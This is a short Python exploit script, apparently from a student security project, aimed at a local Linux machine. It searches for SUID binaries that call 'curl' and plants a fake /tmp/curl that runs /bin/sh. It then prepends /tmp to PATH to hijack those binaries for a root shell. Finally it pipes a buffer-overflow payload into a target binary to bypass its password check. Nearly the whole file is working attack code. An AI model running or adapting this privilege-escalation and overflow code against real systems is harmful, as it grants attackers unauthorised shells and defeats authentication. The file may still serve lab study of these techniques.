import subprocess
import os
import shutil

suid_files_bytes = subprocess.check_output(['find / -type f -perm -u=s 2>>/dev/null | grep .exe'], stdin=subprocess.PIPE, shell=True)
suid_files = suid_files_bytes.decode('utf-8')
suid_files = suid_files.split('\n')

open_doors = []

for file in suid_files:
    if(file):
        try:
            relative_path_calls = subprocess.check_output([f'strings {file} | grep curl'], stdin=subprocess.PIPE, shell=True)
            print("relative path calls: ",relative_path_calls)
            if(relative_path_calls):
                open_doors.append(file)
        except:
            print("no relative paths for curl found in file: ", file)
        

print('open_doors:', open_doors)


os.chdir('/tmp')

# Create a new file called 'curl' with the contents '/bin/sh'
with open('curl', 'w') as f:
    f.write('/bin/sh\n')

# Change the permissions of the destination file to 777
os.chmod("/tmp/curl", 0o777)

# Update the PATH environment variable
os.environ["PATH"] = "/tmp:" + os.environ["PATH"]
print("Updated PATH: " + os.environ["PATH"])

subprocess.check_output('echo /bin/sh ', shell=True)

curl_path = subprocess.check_output("which curl", shell=True)
print("curl path: ",curl_path.decode('utf-8'))


curl_check = subprocess.check_output("ls -l /tmp/curl", shell=True)
print("curl path: ",curl_check.decode('utf-8'))


# ----------
# password check bypass payload
payload = b'A' * 35 + b'\x01\x00\x00\x00'
subprocess.run(["/home/projekt/Desktop/ProjektIC/downloaded_malicious_piece_of_software.exe"], input=payload)

# proc = subprocess.Popen(["/home/projekt/Desktop/ProjektIC/downloaded_malicious_piece_of_software.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# Send the payload as input to the program
# stdout, _ = proc.communicate(input=payload)

# Print the output from the program
# print(stdout.decode('utf-8'))

